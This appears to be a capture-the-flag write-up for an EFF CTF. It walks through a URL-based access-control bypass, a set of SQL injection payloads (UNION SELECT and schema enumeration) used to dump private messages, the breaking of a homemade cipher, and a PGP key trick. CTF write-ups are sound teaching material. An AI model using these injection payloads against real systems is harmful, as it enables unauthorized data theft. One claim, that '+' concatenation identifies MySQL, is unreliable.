# Capture The Flag by EFF
https://eff-ctf.org

### Level 0 The Social Notwork

Your inbox:

https://level0x0.eff-ctf.org/user/M1k3y/message/1

Replace user with usdhs for:

https://level0x0.eff-ctf.org/user/usdhs/message/1

### Level 1 Tweeting Twerps

If there's no results or an error within the SQL statement, you will receive the message "Your SQL is bad and you should feel bad". 

The following lists all tweets and indicates that the form is vulnerable:
```
https://level0x1.eff-ctf.org/tweets?uid=1 OR 1=1--
```

Doing a union select, there are no errors received with two nulls, this indicates the correct number of columns to use:

```
https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null, null--
```

Testing string concatenation further indicates it's a MySQL DB:
```
https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null,'test'+'ing'--
```

Enumerating:

Database:
```
https://level0x1.eff-ctf.org/tweets?uid=3 UNION SELECT null,database()--
```
Tables:
```
https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, table_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
```
Columns:
```
https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
```

Finally, using this information we get the flag in the following private messages:
Private messages:
```
https://level0x1.eff-ctf.org/tweets?uid=1 UNION SELECT null, body FROM messages--
```

![](/images/level1.png)


### Level 2 Reverse Engineering for Fun and No Profit

### Level 3 Never Roll Your Own Crypto

My first incorrect approach was to build a sort of rainbow table.  Keep a hash table with the key as ascii characters, and values as a massive list of ciphers. Keep making requests until you start to receive duplicates.  In theory, this would work.

Correct approach:
Each ascii character produces a random 4 set sized list of integers.  The sum will always be the same.  Create a hashtable  and use the summed value as your key and ascii character as your value.  See level3.py for a rough working solution.

```
$ python level3.py
This week's decryption passphrase is: Don't BULLRUN me bro!
```

### Level 4 A Mole in the Ranks

Go to: 
https://www.igolder.com/pgp/generate-key/

and generate a public and private key with the following e-mail:

Dept of National Security Agent <agent@dns.spy>

Use:  https://level0x4.eff-ctf.org/easyverify to verify that the key returns 'blue'.  You may need a handful of tries generating keys.

![](/images/level4.png)

Plug in the key, and you will receive an encrypted pgp message.  Import the private key you generated before, and decrypt the message for the flag.

```
$ gpg -d enc.txt

You need a passphrase to unlock the secret key for
user: "Dept of National Security Agent <agent@dns.spy>"
2048-bit RSA key, ID E0D72684, created 2016-01-27

gpg: encrypted with 2048-bit RSA key, ID E0D72684, created 2016-01-27
      "Dept of National Security Agent <agent@dns.spy>"
Great, we have a secure channel. Here is the thing I wanted to tell you so badly.

The flag is: Tiny Keyspace is Bad 4 Business
gpg: WARNING: message was not integrity protected
```


